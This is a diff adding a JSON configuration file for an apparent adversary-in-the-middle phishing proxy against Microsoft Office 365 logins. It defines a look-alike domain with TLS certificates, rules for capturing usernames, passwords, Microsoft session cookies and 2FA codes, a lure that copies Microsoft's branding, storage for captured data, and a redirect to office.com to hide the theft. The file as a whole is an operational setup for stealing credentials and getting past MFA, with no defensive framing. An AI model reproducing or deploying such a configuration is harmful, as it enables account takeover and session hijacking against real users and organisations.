@@ -1,0 +1,45 @@
+{
+  "service_name": "office365",
+  "target_domain": "login.microsoftonline.com",
+  "phishing_domain": "o365-login.com",
+  "port": 443,
+  "ssl": {
+    "enabled": true,
+    "auto_generate": false,
+    "lets_encrypt": true,
+    "cert_path": "/etc/letsencrypt/live/o365-login.com/fullchain.pem",
+    "key_path": "/etc/letsencrypt/live/o365-login.com/privkey.pem"
+  },
+  "redirect_url": "https://www.office.com",
+  "capture_rules": {
+    "credentials": [
+      {"field": "username", "selector": "loginfmt"},
+      {"field": "password", "selector": "passwd"}
+    ],
+    "cookies": ["ESTSAUTH", "ESTSAUTHPERSISTENT", "AADSSO"],
+    "2fa_token": "input[name='otc']"
+  },
+  "lure": {
+    "og_title": "Microsoft Office 365 - Sign In",
+    "og_description": "Access your Microsoft 365 account securely.",
+    "og_image": "https://o365-login.com/ms_logo.png",
+    "favicon": "https://o365-login.com/favicon.ico"
+  },
+  "logging": {
+    "level": "DEBUG",
+    "file": "o365_phish.log"
+  },
+  "storage": {
+    "database": "o365_captures.db",
+    "encrypt": true,
+    "ttl_hours": 24
+  },
+  "analytics": {
+    "enabled": true,
+    "database": "o365_analytics.db"
+  },
+  "link_format": {
+    "use_email_fragment": true,
+    "prefill_email": true
+  }
+}
